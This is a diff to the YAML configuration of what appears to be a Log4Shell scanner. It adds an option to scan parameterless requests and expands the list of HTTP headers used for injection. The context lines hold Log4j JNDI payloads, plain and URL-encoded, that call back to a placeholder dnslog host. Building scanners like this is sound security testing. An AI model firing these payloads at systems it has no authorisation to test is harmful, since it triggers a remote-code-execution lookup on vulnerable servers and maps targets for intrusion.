@@ -34,6 +34,10 @@ scan:
     isScanXml: true
     # 用于判断是否将 多出来的部分消息正文中参数属性值 作为扫描参数(例如上传文件的名称)
     isScanParamMultipart: true
+    # 用于判断空参数是否是扫描
+    # 例如: GET /xxx HTTP/1.1
+    # 其它的啥参数也没有了, 这时候开启这个选项会去构造一次请求进行漏洞扫描
+    isScanNullParameter: true
 
 # url黑名单后缀
 # url的后缀出现这些字段的都不进行测试
@@ -111,7 +115,6 @@ application:
         - "X-Originating-IP"
         - "CF-Connecting_IP"
         - "True-Client-IP"
-        - "X-Forwarded-For"
         - "Originating-IP"
         - "X-Real-IP"
         - "X-Client-IP"
@@ -119,6 +122,16 @@ application:
         - "X-Wap-Profile"
         - "X-Api-Version"
         - "If-Modified-Since"
+        - "Sec-Fetch-Dest"
+        - "Sec-Ch-Ua"
+        - "Sec-Ch-Ua-Platform"
+        - "Upgrade-Insecure-Requests"
+        - "Accept"
+        - "Sec-Fetch-Site"
+        - "Sec-Fetch-Mode"
+        - "Sec-Fetch-User"
+        - "Accept-Encoding"
+        - "Accept-Language"
       payloads:
         - "${jndi:dns://dnslog-url/t}"
         - "%24%7Bjndi%3Adns%3A%2F%2Fdnslog-url%2Ft%7D"
